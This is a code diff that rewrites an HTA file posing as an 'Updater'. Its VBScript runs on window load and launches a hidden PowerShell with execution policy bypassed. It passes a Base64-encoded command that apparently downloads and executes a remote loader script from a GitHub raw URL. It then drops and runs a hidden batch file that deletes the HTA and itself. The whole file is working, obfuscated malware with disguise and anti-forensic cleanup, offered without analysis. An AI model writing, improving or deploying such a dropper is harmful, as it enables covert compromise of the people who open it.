@@ -1,22 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <hta:application … />
+  <hta:application
+    id="Updater"
+    applicationname="Updater"
+    border="none"
+    borderstyle="complex"
+    caption="no"
+    sysmenu="no"
+    scroll="no"
+    singleinstance="yes"
+    windowstate="minimize"
+    showintaskbar="no"
+  />
   <title>Updater</title>
   <script language="VBScript">
-    Dim sh: Set sh = CreateObject("WScript.Shell")
-    Dim psPath, cmd
-    psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
-    cmd    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
-    sh.Run Chr(34) & psPath & Chr(34) & " " & cmd, 0, False
-
-    ' Delete self & close
-    Dim htaPath, fso
-    htaPath = document.location.pathname
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    fso.DeleteFile htaPath, True
-    self.close
+    Sub Window_OnLoad()
+        Dim sh, psPath, psArgs, fso, htaPath
+        Set sh = CreateObject("WScript.Shell")
+        
+        psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
+        psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & _
+                 "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
+        
+        ' Launch PowerShell
+        sh.Run Chr(34) & psPath & Chr(34) & " " & psArgs, 0, False
+        
+        ' Delay before cleanup to ensure PowerShell starts
+        setTimeout "CleanupAndExit", 3000
+    End Sub
+    
+    Sub CleanupAndExit()
+        Dim fso, htaPath
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        htaPath = Replace(document.location.pathname, "/", "\")
+        If Left(htaPath, 1) = "\" Then htaPath = Mid(htaPath, 2)
+        
+        ' Create a batch file to delete the HTA after a delay
+        Dim batContent, batPath
+        batPath = fso.GetSpecialFolder(2) & "\cleanup.bat"
+        batContent = "@echo off" & vbCrLf & _
+                    "timeout /t 2 /nobreak >nul" & vbCrLf & _
+                    "del """ & htaPath & """ >nul 2>&1" & vbCrLf & _
+                    "del """ & batPath & """ >nul 2>&1"
+        
+        Dim batFile
+        Set batFile = fso.CreateTextFile(batPath, True)
+        batFile.Write batContent
+        batFile.Close
+        
+        ' Run cleanup batch hidden
+        Dim sh
+        Set sh = CreateObject("WScript.Shell")
+        sh.Run Chr(34) & batPath & Chr(34), 0, False
+        
+        self.close
+    End Sub
   </script>
 </head>
-<body></body>
+<body>
+</body>
 </html>
